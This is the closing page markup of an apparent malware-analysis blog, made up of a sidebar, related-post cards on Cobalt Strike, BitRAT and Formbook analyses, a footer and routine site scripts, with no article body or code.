aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/inspecting-powershell-cobalt-strike-beacon/"><div class="card-body"> <em class="timeago small" data-ts="1641686400" > 2022-01-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Inspecting a PowerShell Cobalt Strike Beacon</h3><div class="text-muted small"><p> In this post I want to take a look at a PowerShell-based Cobalt Strike beacon that appeared on MalwareBazaar. This particular beacon is representative of most PowerShell Cobalt Strike activity I se...</p></div></div></a></div><div class="card"> <a href="/hcrypt-injecting-bitrat-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1642896000" > 2022-01-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET</h3><div class="text-muted small"><p> One of my colleagues made a statement recently about how commonplace process injection has become among malware, to the point where it seems adversaries don’t have to think about the injection tech...</p></div></div></a></div><div class="card"> <a href="/formbook-via-vbs-powershell-and-csharp/"><div class="card-body"> <em class="timeago small" data-ts="1648166400" > 2022-03-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Formbook Distributed Via VBScript, PowerShell, and C# Code</h3><div class="text-muted small"><p> Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbo...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/inspecting-powershell-cobalt-strike-beacon/" class="btn btn-outline-primary" prompt="Older"><p>Inspecting a PowerShell Cobalt Strike Beacon</p></a> <a href="/emotet-excel4-macro-analysis/" class="btn btn-outline-primary" prompt="Newer"><p>Emotet's Excel 4.0 Macros Dropping DLLs</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
